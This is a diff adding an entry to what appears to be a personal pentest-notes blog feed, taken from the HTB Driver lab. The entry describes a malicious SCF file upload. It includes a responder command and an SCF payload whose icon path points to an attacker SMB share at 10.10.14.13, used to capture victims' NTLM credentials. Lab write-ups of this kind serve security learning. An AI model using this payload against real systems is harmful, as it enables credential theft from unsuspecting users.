@@ -17,6 +17,30 @@
 "items": [
     
         {
+            "id": "https://mvineza.github.io/spindel/2022/01/23/malicious-scf-upload",
+            "title": "Malicious SCF File Upload",
+            "summary": "Malicious SCF File Upload",
+            "content_text": "OverviewAttacker can upload a maliciuous SCF file that will connect to attacker SMB share once victim accessed it.One example to access SCF file is via explorer.exe.%SystemRoot%\\explorer.exe \"C:\\Users\\victim\\desktop\"Environment Setup  Webapp that allows file upload  Some background script inside victim that access the uploaded filesSteps  Open responder on attacker machinesudo responder -I tun0  Create a malicious SCF file and name it as @evil.scf. Put the path to attacker share.[Shell]Command=2IconFile=\\\\10.10.14.13\\share\\icon.ico[Taskbar]Command=ToggleDesktop  Upload the file and wait for someone to access  You should be able to intercept NTLM credsReference  HTB Driver  SMB Share – SCF File Attacks – Penetration Testing Lab",
+            "content_html": "<h2 id=\"overview\">Overview</h2><p>Attacker can upload a maliciuous SCF file that will connect to attacker SMB share once victim accessed it.</p><p>One example to access SCF file is via <code class=\"language-plaintext highlighter-rouge\">explorer.exe</code>.</p><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>%SystemRoot%\\explorer.exe \"C:\\Users\\victim\\desktop\"</code></pre></div></div><h2 id=\"environment-setup\">Environment Setup</h2><ul>  <li>Webapp that allows file upload</li>  <li>Some background script inside victim that access the uploaded files</li></ul><h2 id=\"steps\">Steps</h2><ul>  <li>Open responder on attacker machine</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nb\">sudo </span>responder <span class=\"nt\">-I</span> tun0</code></pre></div></div><ul>  <li>Create a malicious SCF file and name it as <code class=\"language-plaintext highlighter-rouge\">@evil.scf</code>. Put the path to attacker share.</li></ul><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>[Shell]Command=2IconFile=\\\\10.10.14.13\\share\\icon.ico[Taskbar]Command=ToggleDesktop</code></pre></div></div><ul>  <li>Upload the file and wait for someone to access</li>  <li>You should be able to intercept NTLM creds</li></ul><h2 id=\"reference\">Reference</h2><ul>  <li>HTB Driver</li>  <li><a href=\"https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/\">SMB Share – SCF File Attacks – Penetration Testing Lab</a></li></ul>",
+            "url": "https://mvineza.github.io/spindel/2022/01/23/malicious-scf-upload",
+            
+            
+            
+            "tags": ["windows","rce","foothold","smb"],
+            
+            "date_published": "2022-01-23T00:00:00+08:00",
+            "date_modified": "2022-01-23T00:00:00+08:00",
+            
+                "author":  {
+                "name": "spindel",
+                "url": null,
+                "avatar": null
+                }
+                
+            
+        },
+    
+        {
             "id": "https://mvineza.github.io/spindel/2022/01/22/iis",
             "title": "IIS",
             "summary": "IIS",
